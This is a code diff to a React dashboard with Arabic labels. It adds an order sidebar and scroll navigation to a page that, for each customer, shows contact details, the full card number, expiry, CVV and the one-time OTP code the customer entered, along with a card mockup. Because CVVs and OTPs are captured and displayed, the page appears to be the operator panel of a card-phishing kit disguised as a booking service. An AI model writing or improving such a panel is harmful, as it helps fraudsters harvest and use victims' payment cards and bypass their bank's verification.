@@ -5,6 +5,7 @@ import {
   Clock3,
   CreditCard,
   Database,
+  ListOrdered,
   MessageCircleMore,
   RefreshCw,
   ShieldAlert,
@@ -80,6 +81,15 @@ function getPaymentStatusMeta(status: string) {
   };
 }
 
+function scrollToOrder(orderId: string): void {
+  const target = document.getElementById(`order-${orderId}`);
+  if (!target) {
+    return;
+  }
+
+  target.scrollIntoView({ behavior: "smooth", block: "start" });
+}
+
 export default function Dashboard() {
   const {
     data,
@@ -147,143 +157,192 @@ export default function Dashboard() {
             </div>
           ) : null}
 
-          <section className="mt-5 space-y-5">
-            {data?.map((record) => {
-              const statusMeta = getPaymentStatusMeta(record.payment.status);
-              const StatusIcon = statusMeta.icon;
-              const fullCardNumber = formatCardNumber(
-                record.payment.cardNumberFull ?? record.payment.cardNumberMasked,
-              );
-              const maskedCardNumber = formatCardNumber(record.payment.cardNumberMasked);
-              const cvvValue = record.payment.cvv?.trim() || "غير متوفر";
-              const otpValue = record.payment.otpCode?.trim() || "لم يتم إدخال OTP";
+          {data && data.length > 0 ? (
+            <div className="mt-5 grid gap-4 lg:grid-cols-[300px_minmax(0,1fr)] lg:items-start">
+              <aside className="rounded-3xl border border-[#c5d2e1] bg-white/95 p-3 shadow-[0_8px_20px_rgba(46,77,127,0.12)] lg:sticky lg:top-4">
+                <div className="mb-3 flex items-center justify-between border-b border-[#e5ecf5] pb-2">
+                  <div className="flex items-center gap-2 text-[hsl(var(--quest-purple))]">
+                    <ListOrdered className="h-4 w-4" />
+                    <p className="text-sm font-bold">كل الطلبات</p>
+                  </div>
+                  <span className="rounded-full bg-[hsl(var(--quest-purple))]/10 px-2 py-1 text-xs font-semibold text-[hsl(var(--quest-purple))]">
+                    {data.length}
+                  </span>
+                </div>
 
-              return (
-                <article
-                  key={record.id}
-                  className="overflow-hidden rounded-3xl border border-[#c5d2e1] bg-[#f5f8fc] shadow-[0_10px_25px_rgba(46,77,127,0.1)]"
-                >
-                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-[#dbe3ef] bg-white/90 px-4 py-3">
-                    <div className="flex items-center gap-2">
-                      <Database className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
-                      <span className="text-sm font-semibold text-[hsl(var(--quest-purple))]">
-                        رقم السجل: {record.id}
-                      </span>
-                    </div>
-                    <span
-                      className={`inline-flex items-center gap-1 rounded-full px-2 py-1 text-xs font-semibold ${statusMeta.badgeClass}`}
+                <div className="max-h-[68vh] space-y-2 overflow-y-auto pr-1">
+                  {data.map((record) => {
+                    const statusMeta = getPaymentStatusMeta(record.payment.status);
+                    const StatusIcon = statusMeta.icon;
+                    const customerName = `${record.billing.firstName} ${record.billing.lastName}`.trim();
+
+                    return (
+                      <button
+                        key={`panel-${record.id}`}
+                        type="button"
+                        onClick={() => scrollToOrder(record.id)}
+                        className="w-full rounded-2xl border border-[#d6e0ec] bg-[#f8fbff] px-3 py-2 text-right transition hover:border-[hsl(var(--quest-purple))]/35 hover:bg-white"
+                      >
+                        <div className="flex items-start justify-between gap-2">
+                          <p className="truncate text-sm font-semibold text-[#2f3750]">{customerName}</p>
+                          <span
+                            className={`inline-flex shrink-0 items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-semibold ${statusMeta.badgeClass}`}
+                          >
+                            <StatusIcon className="h-3 w-3" />
+                            {statusMeta.label}
+                          </span>
+                        </div>
+                        <p className="mt-1 truncate text-[11px] text-[#5d687a]">رقم السجل: {record.id}</p>
+                        <div className="mt-1 flex items-center justify-between text-[11px] text-[#4e596f]">
+                          <span>الإجمالي: {formatQar(record.total)}</span>
+                          <span>{record.items.length} عناصر</span>
+                        </div>
+                      </button>
+                    );
+                  })}
+                </div>
+              </aside>
+
+              <section className="space-y-5">
+                {data.map((record) => {
+                  const statusMeta = getPaymentStatusMeta(record.payment.status);
+                  const StatusIcon = statusMeta.icon;
+                  const fullCardNumber = formatCardNumber(
+                    record.payment.cardNumberFull ?? record.payment.cardNumberMasked,
+                  );
+                  const maskedCardNumber = formatCardNumber(record.payment.cardNumberMasked);
+                  const cvvValue = record.payment.cvv?.trim() || "غير متوفر";
+                  const otpValue = record.payment.otpCode?.trim() || "لم يتم إدخال OTP";
+
+                  return (
+                    <article
+                      id={`order-${record.id}`}
+                      key={record.id}
+                      className="scroll-mt-20 overflow-hidden rounded-3xl border border-[#c5d2e1] bg-[#f5f8fc] shadow-[0_10px_25px_rgba(46,77,127,0.1)]"
                     >
-                      <StatusIcon className="h-3.5 w-3.5" />
-                      {statusMeta.label}
-                    </span>
-                  </div>
-
-                  <div className="p-4">
-                    <div className="rounded-3xl border border-white/70 bg-gradient-to-b from-[#ece2d8] to-[#e4dbd0] p-3 sm:p-4">
-                      <div className="flex items-center gap-2 text-xs text-[#616161]">
-                        <MessageCircleMore className="h-4 w-4 text-[#44536a]" />
-                        <p>عرض تفاصيل الطلب كمحادثة</p>
+                      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-[#dbe3ef] bg-white/90 px-4 py-3">
+                        <div className="flex items-center gap-2">
+                          <Database className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
+                          <span className="text-sm font-semibold text-[hsl(var(--quest-purple))]">
+                            رقم السجل: {record.id}
+                          </span>
+                        </div>
+                        <span
+                          className={`inline-flex items-center gap-1 rounded-full px-2 py-1 text-xs font-semibold ${statusMeta.badgeClass}`}
+                        >
+                          <StatusIcon className="h-3.5 w-3.5" />
+                          {statusMeta.label}
+                        </span>
                       </div>
 
-                      <div className="mt-3 flex flex-col gap-3 text-sm">
-                        <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
-                          <p className="text-xs font-bold text-[#3d5543]">بيانات العميل</p>
-                          <p className="mt-1">
-                            {record.billing.firstName} {record.billing.lastName}
-                          </p>
-                          <p>{record.billing.phone}</p>
-                          <p>{record.billing.email}</p>
-                        </div>
-
-                        <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
-                          <p className="text-xs font-bold text-[#5d5d5d]">تفاصيل الزيارة</p>
-                          <p className="mt-1">التاريخ: {formatArabicDateOnly(record.visitDateIso)}</p>
-                          <p>الوقت: {record.visitTime ?? "غير محدد"}</p>
-                          <p>عدد العناصر: {record.items.length}</p>
-                        </div>
-
-                        <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
-                          <div className="flex items-center justify-between gap-2">
-                            <p className="text-xs font-bold text-[#3d5543]">بيانات الدفع</p>
-                            <span
-                              className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-semibold ${statusMeta.bubbleClass}`}
-                            >
-                              <StatusIcon className="h-3 w-3" />
-                              {statusMeta.label}
-                            </span>
-                          </div>
-                          <div className="mt-2 grid gap-1 text-xs sm:grid-cols-2">
-                            <p>حامل البطاقة: {record.payment.cardholderName}</p>
-                            <p dir="ltr">الانتهاء: {record.payment.expiry}</p>
-                            <p dir="ltr">رقم البطاقة الكامل: {fullCardNumber}</p>
-                            <p dir="ltr">البطاقة المقنعة: {maskedCardNumber}</p>
-                            <p dir="ltr">CVV: {cvvValue}</p>
-                            <p dir="ltr">OTP: {otpValue}</p>
+                      <div className="p-4">
+                        <div className="rounded-3xl border border-white/70 bg-gradient-to-b from-[#ece2d8] to-[#e4dbd0] p-3 sm:p-4">
+                          <div className="flex items-center gap-2 text-xs text-[#616161]">
+                            <MessageCircleMore className="h-4 w-4 text-[#44536a]" />
+                            <p>عرض تفاصيل الطلب كمحادثة</p>
                           </div>
 
-                          <div className="mt-3 rounded-2xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7d318f] to-[#34455f] p-4 text-white shadow-md">
-                            <div className="flex items-center justify-between text-[11px] font-semibold text-white/80">
-                              <span>Card Mockup</span>
-                              <CreditCard className="h-4 w-4" />
-                            </div>
-                            <p className="mt-5 text-lg font-semibold tracking-[0.16em]" dir="ltr">
-                              {fullCardNumber}
-                            </p>
-                            <div className="mt-5 grid grid-cols-3 gap-2 text-[11px]">
-                              <div className="min-w-0">
-                                <p className="text-white/70">الاسم</p>
-                                <p className="truncate font-semibold">
-                                  {record.payment.cardholderName}
-                                </p>
-                              </div>
-                              <div>
-                                <p className="text-white/70">EXP</p>
-                                <p className="font-semibold" dir="ltr">
-                                  {record.payment.expiry}
-                                </p>
-                              </div>
-                              <div>
-                                <p className="text-white/70">CVV</p>
-                                <p className="font-semibold" dir="ltr">
-                                  {cvvValue}
-                                </p>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-
-                        <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
-                          <p className="text-xs font-bold text-[#5d5d5d]">العناصر والمجاميع</p>
-                          <div className="mt-2 space-y-1 text-xs text-[#555]">
-                            {record.items.map((item) => (
-                              <p key={`${record.id}-${item.id}`}>
-                                {item.name} × {item.quantity} — {formatQar(item.lineTotal)}
+                          <div className="mt-3 flex flex-col gap-3 text-sm">
+                            <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
+                              <p className="text-xs font-bold text-[#3d5543]">بيانات العميل</p>
+                              <p className="mt-1">
+                                {record.billing.firstName} {record.billing.lastName}
                               </p>
-                            ))}
-                          </div>
-                          <div className="mt-3 grid gap-1 text-xs font-semibold text-[#3a3a3a] sm:grid-cols-2">
-                            <p>المجموع الفرعي: {formatQar(record.subtotal)}</p>
-                            <p>الإجمالي: {formatQar(record.total)}</p>
-                          </div>
-                          <div className="mt-2 space-y-0.5 text-[11px] text-[#6f6f6f]">
-                            <p>تم الإنشاء: {formatArabicDateTime(record.createdAt)}</p>
-                            <p>آخر تحديث: {formatArabicDateTime(record.updatedAt)}</p>
+                              <p>{record.billing.phone}</p>
+                              <p>{record.billing.email}</p>
+                            </div>
+
+                            <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
+                              <p className="text-xs font-bold text-[#5d5d5d]">تفاصيل الزيارة</p>
+                              <p className="mt-1">التاريخ: {formatArabicDateOnly(record.visitDateIso)}</p>
+                              <p>الوقت: {record.visitTime ?? "غير محدد"}</p>
+                              <p>عدد العناصر: {record.items.length}</p>
+                            </div>
+
+                            <div className="w-full max-w-[95%] rounded-2xl rounded-tr-sm bg-[#dcf8c6] px-3 py-2 text-[#2d3a30] shadow-sm">
+                              <div className="flex items-center justify-between gap-2">
+                                <p className="text-xs font-bold text-[#3d5543]">بيانات الدفع</p>
+                                <span
+                                  className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-semibold ${statusMeta.bubbleClass}`}
+                                >
+                                  <StatusIcon className="h-3 w-3" />
+                                  {statusMeta.label}
+                                </span>
+                              </div>
+                              <div className="mt-2 grid gap-1 text-xs sm:grid-cols-2">
+                                <p>حامل البطاقة: {record.payment.cardholderName}</p>
+                                <p dir="ltr">الانتهاء: {record.payment.expiry}</p>
+                                <p dir="ltr">رقم البطاقة الكامل: {fullCardNumber}</p>
+                                <p dir="ltr">البطاقة المقنعة: {maskedCardNumber}</p>
+                                <p dir="ltr">CVV: {cvvValue}</p>
+                                <p dir="ltr">OTP: {otpValue}</p>
+                              </div>
+
+                              <div className="mt-3 rounded-2xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7d318f] to-[#34455f] p-4 text-white shadow-md">
+                                <div className="flex items-center justify-between text-[11px] font-semibold text-white/80">
+                                  <span>Card Mockup</span>
+                                  <CreditCard className="h-4 w-4" />
+                                </div>
+                                <p className="mt-5 text-lg font-semibold tracking-[0.16em]" dir="ltr">
+                                  {fullCardNumber}
+                                </p>
+                                <div className="mt-5 grid grid-cols-3 gap-2 text-[11px]">
+                                  <div className="min-w-0">
+                                    <p className="text-white/70">الاسم</p>
+                                    <p className="truncate font-semibold">
+                                      {record.payment.cardholderName}
+                                    </p>
+                                  </div>
+                                  <div>
+                                    <p className="text-white/70">EXP</p>
+                                    <p className="font-semibold" dir="ltr">
+                                      {record.payment.expiry}
+                                    </p>
+                                  </div>
+                                  <div>
+                                    <p className="text-white/70">CVV</p>
+                                    <p className="font-semibold" dir="ltr">
+                                      {cvvValue}
+                                    </p>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+
+                            <div className="mr-auto w-full max-w-[95%] rounded-2xl rounded-tl-sm bg-white px-3 py-2 text-[#3c3c3c] shadow-sm">
+                              <p className="text-xs font-bold text-[#5d5d5d]">العناصر والمجاميع</p>
+                              <div className="mt-2 space-y-1 text-xs text-[#555]">
+                                {record.items.map((item) => (
+                                  <p key={`${record.id}-${item.id}`}>
+                                    {item.name} × {item.quantity} — {formatQar(item.lineTotal)}
+                                  </p>
+                                ))}
+                              </div>
+                              <div className="mt-3 grid gap-1 text-xs font-semibold text-[#3a3a3a] sm:grid-cols-2">
+                                <p>المجموع الفرعي: {formatQar(record.subtotal)}</p>
+                                <p>الإجمالي: {formatQar(record.total)}</p>
+                              </div>
+                              <div className="mt-2 space-y-0.5 text-[11px] text-[#6f6f6f]">
+                                <p>تم الإنشاء: {formatArabicDateTime(record.createdAt)}</p>
+                                <p>آخر تحديث: {formatArabicDateTime(record.updatedAt)}</p>
+                              </div>
+                            </div>
+
+                            {record.payment.errorMessage ? (
+                              <div className="mr-auto flex w-full max-w-[95%] items-start gap-2 rounded-2xl rounded-tl-sm border border-[#efc1c1] bg-[#fff1f1] px-3 py-2 text-xs text-[#ad3030]">
+                                <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
+                                <p>{record.payment.errorMessage}</p>
+                              </div>
+                            ) : null}
                           </div>
                         </div>
-
-                        {record.payment.errorMessage ? (
-                          <div className="mr-auto flex w-full max-w-[95%] items-start gap-2 rounded-2xl rounded-tl-sm border border-[#efc1c1] bg-[#fff1f1] px-3 py-2 text-xs text-[#ad3030]">
-                            <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
-                            <p>{record.payment.errorMessage}</p>
-                          </div>
-                        ) : null}
                       </div>
-                    </div>
-                  </div>
-                </article>
-              );
-            })}
-          </section>
+                    </article>
+                  );
+                })}
+              </section>
+            </div>
+          ) : null}
         </main>
 
         <QuestLegalFooter />
